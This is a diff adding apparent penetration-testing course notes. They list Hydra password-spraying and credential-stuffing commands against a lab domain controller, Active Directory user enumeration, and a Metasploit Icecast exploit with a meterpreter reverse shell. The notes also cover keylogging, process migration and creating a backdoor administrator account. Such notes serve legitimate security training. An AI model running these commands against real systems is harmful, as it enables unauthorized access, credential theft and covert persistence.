@@ -74,3 +74,218 @@ nc.exe -nv -w 1 LINUX_ETH0_ADDRESS(SRC_IP) 9999
 
 Windows -> Linux
 cat C:\CourseFiles\capture.pcap -AsByteStream | nc.exe -nvlp 9999 -w 1
+
+
+======================================================================================================================================================================================
+
+Hydra
+
+Password spraying (multiple usernames, one or few passwords)
+
+hydra -L /opt/passwords/facebook-f.last-100.txt -p Winter2025! -m workgroup:{hiboxy} 10.130.10.4 smb2
+
+-l: accept a single username
+-L: accept a file with a list of usernames
+-p: accept a single password
+-P: accept a file with a list of passwords
+-m workgroup:{hiboxy}: We are connecting to a domain controller and we need to specify the domain (note: you need the {}),
+smb2 : the protocol
+
+Once you've found users with password matches, you might try re-gathering BloodHound data as each user to see if you have new administrative permissions, marking them as "owned" inside the BloodHound UI, and reviewing their group memberships to see if they have any additional permissions (such as to internal file shares or applications).
+
+============================================
+
+Command to look at nmap output with ports of interest and extract out only the hosts:
+
+grep 445/open /tmp/smb.gnmap | cut -d' ' -f 2 | tee /tmp/smbservers.txt
+
+.gnmap is the greppable output format of nmap
+
+============================================
+
+Password guessing
+
+hydra -m workgroup:{hiboxy} -l bgreen -p Password1 -M /tmp/smbservers.txt smb2
+
+Why does it look like this account has access to all these Windows systems? Remember, all we are doing is determining if the domain account credentials are valid. This check does NOT check if the user has administrative access to these remote machines. To perform this type of check we need to use a tool, such as Find-LocalAdminAccess from PowerSploit.
+https://powersploit.readthedocs.io/en/latest/Recon/Find-LocalAdminAccess/
+
+
+============================================
+
+Credential stuffing
+
+hydra -C /opt/passwords/hiboxy-breach.txt 10.130.10.4 -m workgroup:{hiboxy} smb2
+
+-C: specify a file with username:password lines
+
+
+=============================================
+
+List all Active Directory users using a single user's username and password, usign Impact's GetADUsers.py
+
+GetADUsers.py hiboxy.com/bgreen:Password1 -dc-ip 10.130.10.4 -all | tee /tmp/adusers.txt
+
+
+Extract out only the usernames from the above command's output:
+
+tail -n +6 /tmp/adusers.txt | cut -d ' ' -f 1 | tee /tmp/domainusers.txt
+
+======================================================================================================================================================================================
+
+
+Metasploit
+
+- Start metasploit on linux:
+
+msfconsole
+
+- List the exploits available:
+
+show exploits
+
+- Search by phrase for an exploit:
+
+search icecast
+
+- Use a particular exploit:
+
+use exploit/windows/http/icecast_header
+
+
+- Set a payload type (which will determine the kind of reverse connection received):
+
+set PAYLOAD windows/meterpreter/reverse_http
+
+- Show the options related to the current chosen exploit:
+
+show options
+
+
+- Set options required for an exploit
+
+set RHOSTS WINDOWS_ETHERNET0_ADDRESS
+
+- Launch the attack (after all required options are set)
+
+run
+
+
+- view all the active meterpreter sessions
+
+sessions
+
+
+- rename a meterpeter session
+
+sessions -n icecast_win11 -i 1
+
+
+- Go into a meterpeter session again
+
+sessions -i <id>
+
+
+- grab a screenshot:
+
+screenshot -p /home/sec560/screenshot.jpg
+
+
+- get the process id of the current meterpreter session process:
+
+getpid
+
+
+- Migrate the meterpeter process to a new process:
+
+migrate -N explorer.exe (this will search for the process "explorer.exe and move the current meterpreter into that process)
+
+
+- start keylogging
+
+keyscan_start
+
+
+- dump the keylogs collected so far:
+
+keyscan_dump
+
+
+- stop keylogging
+
+keyscan_stop
+
+
+
+=======================================================
+
+Meterpreter
+
+- Put the meterpreter session to background
+
+background (or ctrl-z, bckground is safer though)
+
+
+- get system info in meterpeter shell
+
+sysinfo
+
+
+- Get current user id as which meterpreter session process is running
+
+getuid
+
+
+- list the processes
+
+ps
+
+- get help about the ps command
+
+ps -h
+
+- Find a particular process by name
+
+ps -S Icecast2.exe
+
+
+- change dictories using absolute path:
+
+cd 'c:\'
+
+- start a cmdline shell from meterpreter:
+
+shell
+
+
+- (on the windows shell) display the username:
+
+hostname
+
+- (on the windows shell) view the users available:
+
+net user
+
+
+- (on the windows shell) create a new user on windows:
+
+net user BACKDOOR Password1 /add
+
+
+- (on the windows shell) get user info:
+
+net user BACKDOOR
+
+- Add the user to administrators group:
+
+net localgroup administrators BACKDOOR /add
+
+
+- display the group details:
+
+net localgroup administrators
+
+- delete a user:
+
+net user BACKDOOR /del
+
